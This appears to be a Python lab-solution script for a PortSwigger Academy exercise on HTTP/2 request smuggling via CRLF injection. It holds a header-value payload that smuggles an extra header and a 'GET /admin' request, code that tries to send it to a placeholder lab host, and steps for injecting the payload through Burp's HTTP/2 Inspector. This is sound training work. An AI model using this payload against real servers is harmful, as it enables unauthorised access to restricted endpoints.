"""
Lab 15: HTTP/2 request smuggling via CRLF injection
https://portswigger.net/web-security/request-smuggling/advanced/h2-request-smuggling-crlf-injection
Difficulty: Practitioner

📝 A raw \\r\\n embedded in an HTTP/2 header VALUE is illegal per spec — but
if the back-end's downgrade-to-HTTP/1.1 step doesn't validate for it, those
bytes become a literal line break once rendered as HTTP/1.1 text, letting
us inject ENTIRE EXTRA HEADERS (or a full second request) into what the
back-end parses as a single request from the front-end's point of view.

⚠️ The `h2` Python library validates header values and will raise on an
embedded \\r\\n — this is a case where a spec-compliant client can't send
the illegal bytes needed. Genuine testing requires Burp's HTTP/2 Inspector,
which allows editing raw header values below the validation layer. This
script documents the intended payload shape and attempts the send via h2
(expect it to fail cleanly) so the structure is still here as reference.
"""

from utils import open_h2_via_burp, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"

# The injected value — this is what you'd paste into Burp's raw HTTP/2
# header editor for a header like `foo`, NOT something h2 will let through
# via normal send_headers().
MALICIOUS_HEADER_VALUE = "bar\r\nX-Smuggled: injected\r\nGET /admin HTTP/1.1\r\nX-Ignore: X"


def run():
    note(f"Intended raw header value to inject via Burp's HTTP/2 Inspector:")
    note(f"  foo: {MALICIOUS_HEADER_VALUE!r}")

    tls_sock, conn = open_h2_via_burp(HOST)
    headers = [
        (":method", "GET"),
        (":authority", HOST),
        (":scheme", "https"),
        (":path", "/"),
        ("foo", MALICIOUS_HEADER_VALUE),
    ]
    try:
        conn.send_headers(1, headers, end_stream=True)
        tls_sock.sendall(conn.data_to_send())
        log("Unexpectedly sent — library version may not validate this.")
    except Exception as e:
        log(f"h2 library rejected the CRLF-containing header, as expected: {e}", ok=False)
        note("Switch to Burp: right-click the request > 'Change request method'")
        note("stays HTTP/2, open Inspector, add the header with the raw value")
        note("above directly in the hex/raw view to bypass client validation.")


if __name__ == "__main__":
    run()
